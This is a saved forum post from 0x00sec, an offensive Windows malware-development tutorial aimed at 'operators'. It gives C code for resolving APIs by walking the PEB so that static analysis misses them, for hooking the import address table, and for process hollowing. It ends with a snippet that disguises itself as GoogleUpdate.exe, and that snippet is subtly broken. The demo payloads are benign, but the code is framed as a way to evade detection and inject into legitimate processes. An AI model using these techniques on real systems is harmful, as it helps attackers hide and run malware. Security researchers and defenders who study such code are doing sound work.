<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Malware Development Essentials for Operators - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Introduction
This article will delve into fundamental and techniques related to malware development for Windows OS, We‚Äôll start by exploring the WinAPI, understanding how code manipulation works in the context of malware&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="37769.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Malware Development Essentials for Operators&#39;" href="37769.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png" />
<meta property="og:url" content="https://0x00sec.org/t/malware-development-essentials-for-operators/37769" />
<meta name="twitter:url" content="https://0x00sec.org/t/malware-development-essentials-for-operators/37769" />
<meta property="og:title" content="Malware Development Essentials for Operators" />
<meta name="twitter:title" content="Malware Development Essentials for Operators" />
<meta property="og:description" content="Introduction This article will delve into fundamental and techniques related to malware development for Windows OS, We‚Äôll start by exploring the WinAPI, understanding how code manipulation works in the context of malware development. We‚Äôll cover things like loading functions dynamically, accessing the Process Environment Block (PEB), and executing functions in code, Next  we‚Äôll look into obfuscation and payload encoding. We‚Äôll use techniques like XOR and AES encryption to make our malicious code..." />
<meta name="twitter:description" content="Introduction This article will delve into fundamental and techniques related to malware development for Windows OS, We‚Äôll start by exploring the WinAPI, understanding how code manipulation works in the context of malware development. We‚Äôll cover things like loading functions dynamically, accessing the Process Environment Block (PEB), and executing functions in code, Next  we‚Äôll look into obfuscation and payload encoding. We‚Äôll use techniques like XOR and AES encryption to make our malicious code..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="malware" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="21 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="22 ‚ù§" />
<meta property="article:published_time" content="2023-11-08T02:33:14+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="37769.html">Malware Development Essentials for Operators</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/malware.html" class="discourse-tag" rel="tag">malware</a>,
<a href="../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Malware Development Essentials for Operators">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="malware, hacking">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0xf00I"><span itemprop="name">0xf00I</span></a>
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-11-08T02:33:14Z" class="post-time">
November 8, 2023, 2:33am
</time>
<meta itemprop="dateModified" content="2023-11-10T14:37:42Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<h1><a name="introduction-1" class="anchor" href="37769.html#introduction-1"></a>Introduction</h1>
<p>This article will delve into fundamental and techniques related to malware development for Windows OS, We‚Äôll start by exploring the WinAPI, understanding how code manipulation works in the context of malware development. We‚Äôll cover things like loading functions dynamically, accessing the Process Environment Block (PEB), and executing functions in code, Next we‚Äôll look into obfuscation and payload encoding. We‚Äôll use techniques like XOR and AES encryption to make our malicious code harder to detect. We‚Äôll also explore ways to insert our malicious code, like using classic shellcode and DLL injections To wrap things up, we‚Äôll create a simple rootkit, concluding our journey through the world of malware development, As usual, we will delve into the code and techniques, providing a detailed, step-by-step breakdown.</p>
<h1><a name="dynamic-function-loading-and-execution-2" class="anchor" href="37769.html#dynamic-function-loading-and-execution-2"></a>Dynamic Function Loading and Execution</h1>
<p>Time to dive into some naked code action! We‚Äôre gonna break down this code and make it crystal clear, so you can get what‚Äôs going on.</p>
<pre><code class="lang-c">int main(void) {
MessageBoxA(0, "Foo Here.", "info", 0);
return 0;
}
</code></pre>
<p>This is a simple program. It uses the <code>MessageBoxA</code> function, which is part of the Windows API. This function displays a modal dialog box with specified text and a caption. In this code, we‚Äôre making a straightforward call to the <code>MessageBoxA</code> function to show a message box.</p>
<p>The <code>MessageBoxA</code> function is statically linked to your program during the compilation process. This means that the function‚Äôs code is included in your program, so you don‚Äôt need to load it at runtime.</p>
<p>Now, let‚Äôs contrast this with the following code:</p>
<pre><code class="lang-c">int main(void) {
size_t get_MessageBoxA = (size_t)GetProcAddress( LoadLibraryA("USER32.dll"), "MessageBoxA" );
def_MessageBoxA msgbox_a = (def_MessageBoxA) get_MessageBoxA;
msgbox_a(0, "Foo Here.", "info", 0);
return 0;
}
</code></pre>
<p>In this code, we take a different approach. We dynamically load and call the <code>MessageBoxA</code> function using the <code>GetProcAddress</code> function. This function retrieves the address of the <code>MessageBoxA</code> function from the USER32.dll library at runtime.</p>
<p>To work with this dynamically loaded function, we define a function pointer type <code>def_MessageBoxA</code> that matches the signature of the <code>MessageBoxA</code> function. We then cast the obtained function address to this function pointer and use it to call the function.</p>
<p>So, how is this related to malware? Well, by dynamically loading functions, we can avoid having to statically link to libraries that are associated with shady activity, meaning that hooking a function dynamically with the use of pointers can make it more challenging for static analysis tools to identify the behavior of the code. Let‚Äôs Take an example:</p>
<pre><code class="lang-c">__declspec(dllexport) void func01() { MessageBoxA(0, "", "Function 1", 0); }
__declspec(dllexport) void func02() { MessageBoxA(0, "", "Function 2", 0); }

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Hook function func01
    }
    return TRUE;
}
</code></pre>
<p>In this example, we have a DLL with two exported functions, <code>func01</code> and <code>func02</code>. Initially, both functions display message boxes. However, in the <code>DllMain</code> function, which is automatically executed when the DLL is loaded may start with benign functionality but could use dynamic function loading and function hooking to change the behavior of <code>func01</code> at runtime. So, let‚Äôs continue on this code manipulation journey, exploring the intricacies of dynamic function loading, PEB access, and function execution, which are essential concepts in understanding how code can be adapted and manipulated.</p>
<p>Before, continuing I would like to highlight in which step PEB is created on process creation When <em>Starting a program</em> (calc.exe for example): calc.exe will call a win32 API function : <strong>CreateProcess</strong> which sends to the OS the request to create this process and start the execution.</p>
<p>Creating the process data structures: Windows creates the process structure <strong>EPROCESS</strong> on kernel land for the newly created calc.exe process, Initialize the virtual memory: Then, Windows creates the process, virtual memory, and its representation of the physical memory and saves it inside the <strong>EPROCESS</strong> structure, <code>creates the PEB structure with all necessary information, and then loads the main two DLLs that Windows applications will always need, which are ntdll.dll and kernel32.dll</code> and finally loading the PE file and start the execution.</p>
<ul>
<li><strong>PEB</strong> can be accessed from <strong>User Mode</strong> - Contains Process specific information</li>
<li><strong>EPROCESS</strong> can be only be accessed from <strong>Kernel Mode</strong></li>
</ul>
<h3><a name="peb-structure-3" class="anchor" href="37769.html#peb-structure-3"></a>PEB Structure</h3>
<p>PEB is a data structure in the Windows operating system that contains information and settings related to a running process, The process control block contains data that is only useful to the kernel, such as the preferred CPU for this process. The Thread Control Block is entirely different, and is what the kernel uses to manage threads, which are what the kernel runs at the lowest level.</p>
<p>the PEB is accessed to retrieve information about loaded modules, specifically the base addresses of dynamically linked libraries (DLLs). Let‚Äôs explore how the PEB is used in the code:</p>
<pre><code class="lang-c">typedef struct _PEB_LDR_DATA {
ULONG Length;
UCHAR Initialized;
PVOID SsHandle;
LIST_ENTRY InLoadOrderModuleList;
LIST_ENTRY InMemoryOrderModuleList;
LIST_ENTRY InInitializationOrderModuleList;
PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA; 

typedef struct _UNICODE_STRING32 {
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
} UNICODE_STRING32, *PUNICODE_STRING32;

typedef struct _PEB32 {
    // ...
} PEB32, *PPEB32;

typedef struct _PEB_LDR_DATA32 {
    // ...
} PEB_LDR_DATA32, *PPEB_LDR_DATA32;

typedef struct _LDR_DATA_TABLE_ENTRY32 {
    // ...
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;
</code></pre>
<p>As you can see, the PEB is a robust structure. The code defines several structures, such as <code>PEB32</code>, <code>PEB_LDR_DATA32</code>, and <code>LDR_DATA_TABLE_ENTRY32</code>, which are simplified versions of the actual PEB data structures. These structures contain fields that hold information about loaded modules and their locations in memory.</p>
<pre><code class="lang-c">size_t GetModHandle(wchar_t *libName) {
PEB32 *pPEB = (PEB32 *)__readfsdword(0x30); // ds: fs[0x30]
PLIST_ENTRY header = &amp;(pPEB-&gt;Ldr-&gt;InMemoryOrderModuleList);

for (PLIST_ENTRY curr = header-&gt;Flink; curr != header; curr = curr-&gt;Flink) {
LDR_DATA_TABLE_ENTRY32 *data = CONTAINING_RECORD(
curr, LDR_DATA_TABLE_ENTRY32, InMemoryOrderLinks

);
printf("current node: %ls\n", data-&gt;BaseDllName.Buffer);
if (StrStrIW(libName, data-&gt;BaseDllName.Buffer))
return data-&gt;DllBase;
}
return 0;
}
</code></pre>
<p>The <code>GetModHandle</code> function accesses the PEB to find the base address of a loaded module. The PEB contains a data structure called <code>PEB_LDR_DATA</code> that manages information about loaded modules. The <code>InMemoryOrderModuleList</code> field of this structure is a linked list of loaded modules. The <code>GetModHandle</code> function iterates through this list and compares module names to find the desired module based on the <code>libName</code> parameter.</p>
<p>The PEB can be found at fs:[0x30] in the Thread Environment Block for x86 processes as well as at GS:[0x60] for x64 processes.</p>
<p>Next we call the <code>GetFuncAddr</code>function which well be used to locate the address of a specific function within a loaded module. It takes the <code>moduleBase</code> parameter, which is the base address of the module, and it looks into the export table of the module to find the address of the function with the specified name (<code>szFuncName</code>). The export table is part of the module‚Äôs data structure, which is managed by the PEB.</p>
<pre><code class="lang-auto">size_t GetFuncAddr(size_t moduleBase, char* szFuncName) {

// parse export table
PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(moduleBase);
PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(moduleBase + dosHdr-&gt;e_lfanew);
IMAGE_OPTIONAL_HEADER optHdr = ntHdr-&gt;OptionalHeader;
IMAGE_DATA_DIRECTORY dataDir_exportDir = optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

// parse exported function info

PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + dataDir_exportDir.VirtualAddress);
DWORD* arrFuncs = (DWORD *)(moduleBase + exportTable-&gt;AddressOfFunctions);
DWORD* arrNames = (DWORD *)(moduleBase + exportTable-&gt;AddressOfNames);
WORD* arrNameOrds = (WORD *)(moduleBase + exportTable-&gt;AddressOfNameOrdinals);
</code></pre>
<p>The function begins by parsing the export table of the loaded module to access information about its exported functions. The export table is part of the Portable Executable (PE) file format and contains details about functions that can be accessed externally.</p>
<ol>
<li>accesses the DOS header and the NT header to navigate to the Optional Header of the PE file.</li>
<li>identifies the data directory for exports using the <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> index from the Optional Header‚Äôs data directory array.</li>
<li>calculates the address of the export table, which holds data related to the module‚Äôs exported functions.</li>
</ol>
<p>Next, inside the loop, it compares the current exported function‚Äôs name (<code>sz_CurrApiName</code>) with the target function name (<code>szFuncName</code>) using a case-insensitive comparison. When a match is found, the function prints information about the matching function, including its name and ordinal.</p>
<pre><code class="lang-c">// lookup
for (size_t i = 0; i &lt; exportTable-&gt;NumberOfNames; i++) {
char* sz_CurrApiName = (char *)(moduleBase + arrNames[i]);
WORD num_CurrApiOrdinal = arrNameOrds[i] + 1;
if (!stricmp(sz_CurrApiName, szFuncName)) {
printf("[+] Found ordinal %.4x - %s\n", num_CurrApiOrdinal, sz_CurrApiName); //enumeration process 
return moduleBase + arrFuncs[ num_CurrApiOrdinal - 1 ];
}
}
return 0;
}
</code></pre>
<p>If the target function name matches the current function name, the function returns the address of that function. It calculates the function‚Äôs address by referencing the <code>arrFuncs</code> array and the ordinal. The ordinal, when converted to an index, helps retrieve the correct address from the array.</p>
<p>Why is This Important this technique is usually how code injection is preformed and yes dynamic function loading, now Let‚Äôs take a look at main function.</p>
<pre><code class="lang-c">int main(int argc, char** argv, char* envp) {
    size_t kernelBase = GetModHandle(L"kernel32.dll");
    printf("[+] GetModHandle(kernel32.dll) = %p\n", kernelBase); // result of the `GetModHandle` 
    
    size_t ptr_WinExec = (size_t)GetFuncAddr(kernelBase, "WinExec");
    printf("[+] GetFuncAddr(kernel32.dll, WinExec) = %p\n", ptr_WinExec); // the address of the `WinExec`
    ((UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec)("calc", SW_SHOW); 
    return 0;
}
</code></pre>
<p>We calls the <code>GetModHandle</code> function to find the base address of the ‚Äúkernel32.dll‚Äù module in the current process. It uses the PEB to traverse the list of loaded modules and search for the one with the specified name (‚Äúkernel32.dll‚Äù), Next we calls the <code>GetFuncAddr</code> to locate the address of the <code>WinExec</code>, passes the base address of ‚Äúkernel32.dll‚Äù obtained in the previous step and the function name ‚ÄúWinExec‚Äù as arguments and Finally, the code dynamically invokes the <code>WinExec</code> function using the address obtained earlier. It casts the <code>ptr_WinExec</code> to the appropriate function pointer type and calls it with the arguments ‚Äúcalc‚Äù (to run the Windows Calculator) and <code>SW_SHOW</code></p>
<p>Demonstrates how to dynamically locate and execute the <code>WinExec</code> function from the ‚Äúkernel32.dll‚Äù module, effectively opening the Calculator This shows how code manipulation can be achieved by accessing the PEB and locating and using specific functions from loaded modules.</p>
<p>Alright let‚Äôs back up a little bit here ‚ÄúCode Injection‚Äù Here‚Äôs the section to explain and explore further in the context of code injection:</p>
<pre><code class="lang-c">((UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec)("calc", SW_SHOW);
</code></pre>
<p>This line dynamically invokes the <code>WinExec</code> function to open the Windows Calculator. Now, let‚Äôs break down what‚Äôs happening here:</p>
<ul>
<li>
<p><code>(UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec</code> involves typecasting the <code>ptr_WinExec</code> pointer into a function pointer with the appropriate signature. This typecasting is crucial to match the required parameters of the <code>WinExec</code> function, which includes a string (LPCSTR) and an integer (UINT).</p>
</li>
<li>
<p><code>("calc", SW_SHOW)</code> represents the arguments passed to the <code>WinExec</code> function. In this instance, it instructs the system to open the Windows Calculator (‚Äúcalc‚Äù) with a specified display mode (<code>SW_SHOW</code>).</p>
</li>
</ul>
<p>In essence, what‚Äôs occurring here is:</p>
<p>The code dynamically injects the execution of the <code>WinExec</code> function into the context of a legitimate process. Rather than statically linking to the <code>WinExec</code> function, this code locates and invokes it dynamically. Dynamic function loading is a technique often employed in malware to access specific functions without the need for direct imports, making it more evasive.</p>
<p>It‚Äôs important to note that in this code example, opening the Windows Calculator is a benign action. However, it serves as an illustrative case of code injection and dynamic function invocation.</p>
<h1><a name="dynamic-function-loading-iat-hooking-4" class="anchor" href="37769.html#dynamic-function-loading-iat-hooking-4"></a>Dynamic Function Loading (IAT Hooking)</h1>
<p>Dynamic Function Loading is a technique used in the realm of Windows programming and sometimes in malware development to load and execute functions at runtime. One way to achieve this is through ‚ÄúImport Address Table (IAT) Hooking.‚Äù The IAT contains the addresses of functions that a module (such as a DLL or executable) imports from other modules. IAT hooking allows us to intercept and modify function calls by manipulating the IAT.</p>
<p>IAT table looks something like:</p>
<pre><code class="lang-auto">                Application                                               mydll
           +-------------------+                                  +--------------------+
           |                   |                                  |       MessageBoxA  |
           |                   |                    +------------&gt;---------------------+
           | call MessageBoxA  |               IAT  |             |  ....              |
           |                   |       +-------------------+      |(kernel32!MsgBoxA)  |
           +-------------------+       |            |      |      |  ....              |
                             +----------&gt; jmp       +      |      +--------------------+
                                       |                   |      |                    |
                                       +-------------------+      +--------------------+
</code></pre>
<p>First the target program calls a WinAPI <code>MessageBoxA</code> function, the program looks up the <code>MessageBoxA</code> address in the IAT and code execution jumps to the <code>kernel32!MessageBoxA</code> address resolved in step 2 where legitimate code for displaying the <code>MessageBoxA</code> , Here‚Äôs how the IAT table works in the context of a call to a function like <code>MessageBoxA</code>:</p>
<pre><code class="lang-c">#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew))
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS))
</code></pre>
<p>The application code makes a function call to <code>MessageBoxA</code>. This call is typically made using a function or API from a Windows library, When the application code makes a function call, it does not directly call the function‚Äôs code. Instead, it looks up the address of the function in the IAT, which contains entries for various imported functions. Once the address of <code>MessageBoxA</code> is resolved in the IAT, the code execution jumps to that resolved address. In this case, the resolved address points to the legitimate <code>kernel32!MessageBoxA</code> function.</p>
<pre><code class="lang-c">size_t ptr_msgboxa = 0;
void iatHook(char *module, const char *szHook_ApiName, size_t callback, size_t &amp;apiAddr)
{
    auto dir_ImportTable = getNtHdr(module)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    auto impModuleList = (IMAGE_IMPORT_DESCRIPTOR *)&amp;module[dir_ImportTable.VirtualAddress];
    for (; impModuleList-&gt;Name; impModuleList++)
    {
        auto arr_callVia = (IMAGE_THUNK_DATA *)&amp;module[impModuleList-&gt;FirstThunk];
        auto arr_apiNames = (IMAGE_THUNK_DATA *)&amp;module[impModuleList-&gt;OriginalFirstThunk];
        for (int i = 0; arr_apiNames[i].u1.Function; i++)
        {
            auto curr_impApi = (PIMAGE_IMPORT_BY_NAME)&amp;module[arr_apiNames[i].u1.Function];
            if (!strcmp(szHook_ApiName, (char *)curr_impApi-&gt;Name))
            {
                apiAddr = arr_callVia[i].u1.Function;
                arr_callVia[i].u1.Function = callback;
                break;
            }
        }
    }
}

int main(int argc, char **argv)
{
    void (*ptr)(UINT, LPCSTR, LPCSTR, UINT) = [](UINT hwnd, LPCSTR lpText, LPCSTR lpTitle, UINT uType) {
        printf("[hook] MessageBoxA(%i, \"%s\", \"%s\", %i)", hwnd, lpText, lpTitle, uType);
        ((UINT(*)(UINT, LPCSTR, LPCSTR, UINT))ptr_msgboxa)(hwnd, "msgbox got hooked", "alert", uType);
    };

    iatHook((char *)GetModuleHandle(NULL), "MessageBoxA", (size_t)ptr, ptr_msgboxa);
    MessageBoxA(0, "Hook Test", "title", 0);
    return 0;
}
</code></pre>
<p>So What‚Äôs Going on Here? Instead of executing the legitimate <code>kernel32!MessageBoxA</code> function, the IAT entry for <code>MessageBoxA</code> is modified to point to a replacement function (the <code>ptr</code> function in the code). As a result, when the application makes a call to <code>MessageBoxA</code>, it actually calls the replacement function, which can alter or extend the behavior of the original function call.</p>
<h1><a name="process-hollowing-5" class="anchor" href="37769.html#process-hollowing-5"></a>Process Hollowing</h1>
<p>So, Process hollowing is a technique that begins with the creation of a new instance of a legitimate process in a suspended state, The suspended state allows the injected code to be executed within the context of this process.</p>
<p>To successfully perform process hollowing, the source image (the executable being injected into the legitimate process) must meet specific requirements and characteristics to ensure that the technique works effectively. These requirements include:</p>
<ol>
<li><strong>PE Format:</strong> The source image must be in the Portable Executable (PE) format, which is the standard executable file format on Windows. This format includes headers and sections that define the structure of the executable.</li>
<li><strong>Executable Code:</strong> The source image should contain executable code that can be run by the Windows operating system. This code is typically located within the <code>.text</code> section of the PE file.</li>
<li><strong>Address of Entry Point:</strong> The PE header of the source image must specify the address of the entry point, which is the starting point for the execution of the code. The address of the entry point is used to set the <code>EAX</code> register in the context of the suspended process.</li>
<li><strong>Sections and Data:</strong> The source image should contain necessary sections, such as the <code>.text</code> section for code and other sections for data. These sections should be properly defined in the PE header, and the data should be accessible and relevant to the code‚Äôs execution.</li>
<li><strong>Relocation Table:</strong> The source image may have a relocation table that allows it to be loaded at a different base address. If the source image lacks a relocation table, it may only work if it can be loaded at its preferred base address.</li>
</ol>
<p>Creating The Process The target process must be created in the suspended state, The code aims to create a new instance of a process in a suspended state and subsequently replace its code and data with the code and data from another executable (the source image), which includes creating a suspended process and performing memory operations to load the new image.</p>
<pre><code class="lang-c">// Create a new instance of current process in suspended state, for the new image.
if (CreateProcessA(path, 0, 0, 0, false, CREATE_SUSPENDED, 0, 0, &amp;SI, &amp;PI)) 
{
    // Allocate memory for the context.
    CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
    CTX-&gt;ContextFlags = CONTEXT_FULL; // Context is allocated

    // Retrieve the context.
    if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
    {
        pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader-&gt;OptionalHeader.ImageBase),
            NtHeader-&gt;OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

        // File Mapping
        WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, NULL);
        for (int i = 0; i &lt; NtHeader-&gt;FileHeader.NumberOfSections; i++)
            WriteProcessMemory
            (
                PI.hProcess, 
                LPVOID((size_t)pImageBase + SectionHeader[i].VirtualAddress),
                LPVOID((size_t)Image + SectionHeader[i].PointerToRawData), 
                SectionHeader[i].SizeOfRawData, 
                0
            );
    }
}
</code></pre>
<p>Alright <code>CreateProcessA</code> function is used to create a new instance of the current process (or another specified executable) in a suspended state. The <code>CREATE_SUSPENDED</code> flag is used to create the process in a suspended state, meaning its execution is paused, After creating the suspended process, memory is allocated using <code>VirtualAlloc</code> to hold the context of the suspended process. The context structure (<code>CTX</code>) is used to capture information about the process‚Äôs execution state.</p>
<p><strong>Retrieving and Updating Context</strong></p>
<ul>
<li><code>GetThreadContext</code> function is called to retrieve the context of the suspended process‚Äôs main thread (<code>PI.hThread</code>). The context is stored in the <code>CTX</code> structure.</li>
<li>The context is updated to prepare for the execution of the new code. Specifically, the <code>EAX</code> register is set to the address of the entry point of the new code, Next the code then proceeds to copy the headers (PE header) of the source image into the allocated memory within the suspended process using <code>WriteProcessMemory</code>. This is crucial for ensuring that the new image is loaded correctly, A loop iterates through the sections of the source image (<code>SectionHeader</code>) and copies the section data from the source image to corresponding memory locations within the suspended process using <code>WriteProcessMemory</code>. This step is essential to load the code and data.</li>
</ul>
<p>At this point, the process hollowing process is set up, and the new image‚Äôs code and data have been loaded into the memory of the suspended process. The code execution will continue from this point, allowing the new image to execute within the context of the suspended process.</p>
<pre><code class="lang-c">WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;pImageBase), 4, 0);
CTX-&gt;Eax = DWORD(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint;
SetThreadContext(PI.hThread, LPCONTEXT(CTX)); 
ResumeThread(PI.hThread);
</code></pre>
<p>The destination address is calculated as <code>CTX-&gt;Ebx + 8</code>, and 4 bytes of data are written. This memory write operation sets the location where the process should begin execution of the new code.</p>
<p><code>CTX-&gt;Eax</code> is updated with the address of the new code‚Äôs entry point. This effectively sets the instruction pointer (<code>EIP</code>) to the starting point of the loaded code. The entry point address is obtained from the PE header of the source image: <code>NtHeader-&gt;OptionalHeader.AddressOfEntryPoint</code>. Finally, the <code>ResumeThread</code> function is called to resume the execution of the suspended process. At this point, the process begins executing the injected code, starting from the entry point that was set, The injected code within the suspended process will now take control of the process‚Äôs execution.</p>
<pre><code class="lang-c">char CurrentFilePath[MAX_PATH + 1];
GetModuleFileNameA(0, CurrentFilePath, MAX_PATH);
if (strstr(CurrentFilePath, "GoogleUpdate.exe")) {
MessageBoxA(0, "foo", "", 0);
return 0;

LONGLONG len = -1;
RunPortableExecutable("GoogleUpdate.exe", MapFileToMemory(CurrentFilePath, len));
return 0;
}
</code></pre>
